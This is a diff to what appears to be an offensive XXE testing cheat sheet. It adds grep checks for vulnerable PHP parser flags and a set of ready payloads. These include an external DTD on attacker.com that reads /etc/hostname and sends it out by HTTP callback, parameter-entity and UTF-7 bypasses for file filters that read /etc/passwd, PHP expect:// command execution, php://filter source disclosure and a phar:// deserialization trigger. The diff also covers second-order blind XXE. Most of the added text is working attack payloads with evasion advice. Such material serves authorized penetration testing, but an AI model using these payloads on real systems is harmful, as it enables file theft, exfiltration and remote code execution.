@@ -21,6 +21,9 @@ grep -rn "DocumentBuilderFactory\|SAXParserFactory\|XMLInputFactory" --include="
 grep -rn "simplexml_load\|DOMDocument\|XMLReader\|xml_parse" --include="*.php" -A5
 # Look for: libxml_disable_entity_loader(true)  — PHP < 8.0
 # Missing = vulnerable
+# Also flag: LIBXML_NOENT (enables entity substitution) and LIBXML_DTDLOAD (auto-loads external DTDs)
+grep -rn "LIBXML_NOENT\|LIBXML_DTDLOAD\|LIBXML_DTDATTR" --include="*.php"
+# Either flag present = parser is vulnerable to XXE
 
 grep -rn "lxml\|ElementTree\|xml\.etree\|defusedxml" --include="*.py"
 # lxml and ElementTree are vulnerable by default
@@ -68,6 +71,72 @@ grep -rn "nokogiri\|REXML\|LibXML" --include="*.rb"
 %eval;
 %exfil;
 ```
+
+### External DTD to bypass `file://` filter
+When the server filters `file://` in the direct payload, host the DTD externally.
+The `file://` reference moves to your server — server fetches the DTD, DTD reads the file
+and exfiltrates it via HTTP callback:
+
+```xml
+<!-- Payload sent to server (no file:// here): -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+  <!ENTITY % xxe SYSTEM "https://attacker.com/xxe.dtd"> %xxe;
+]>
+<data><post><post_title>test</post_title></post></data>
+```
+
+```xml
+<!-- xxe.dtd hosted on attacker.com: -->
+<!ENTITY % hostname SYSTEM "file:///etc/hostname">
+<!ENTITY % e "<!ENTITY &#x25; xxe SYSTEM 'http://attacker.com/?c=%hostname;'>">
+%e;
+%xxe;
+```
+
+### Parameter entities to bypass `&` filter
+When regular entity syntax (`&name;`) is blocked, use parameter entities
+(`%name;` — usable only within DTD context):
+
+```xml
+<!-- Instead of: <!ENTITY xxe SYSTEM "..."> ... &xxe; -->
+<!-- Use: -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;
+]>
+<root></root>
+```
+
+### UTF-7 encoding bypass
+If XML keyword/symbol filters are in place, encode the entire payload in UTF-7.
+The parser accepts the alternate encoding and processes the entities normally:
+
+```xml
+<?xml version="1.0" encoding="UTF-7"?>
++ADw-+ACE-DOCTYPE+ACA-data+ACA-+AFs-+AAo-+ACA-+ADw-+ACE-ENTITY+ACA-xxe+ACA-SYSTEM+ACA-+ACI-file:///etc/passwd+ACI-+AD4-+AAo-+AF0-+AD4-+AAo-+ADw-data+AD4-+ACY-xxe+ADs-+ADw-/data+AD4-
+```
+Always include the XML prolog with `encoding="UTF-7"`.
+
+### PHP wrapper escalation
+```xml
+<!-- RCE via expect:// (requires PHP Expect module) -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [<!ENTITY exec SYSTEM "expect://id">]>
+<data>&exec;</data>
+
+<!-- Read PHP source as base64 (php://filter) -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">]>
+<data>&xxe;</data>
+
+<!-- PHAR archive read (also triggers insecure deserialization) -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [<!ENTITY xxe SYSTEM "phar:///path/to/file.phar/internal/file.php">]>
+<data>&xxe;</data>
+```
+
+Other wrappers to try: `gopher://`, `ftp://`, `dict://`, `data://`, `zip://`
 
 ### XInclude (when you can't control DOCTYPE)
 ```xml
@@ -118,3 +187,17 @@ cd /tmp/xxe-docx && unzip original.docx
 # Edit word/document.xml: add XXE payload
 zip -r malicious.docx .
 ```
+
+## SECOND-ORDER XXE
+
+The payload is **stored** at the injection point and **executed later** by a background
+worker or async job — making it harder to detect than direct XXE.
+
+Pattern:
+1. Attacker submits malicious XML via import/upload feature → stored without immediate parsing
+2. Background worker retrieves and parses the stored XML (the vulnerable component)
+3. XXE fires out-of-band (blind) — monitor OAST server for callbacks
+
+Detection approach: track all XML data flows throughout the app, including async/queued
+processing. Use OAST (Burp Collaborator / interactsh) rather than direct response reading.
+Test every XML import feature even if the immediate response shows no reflection.
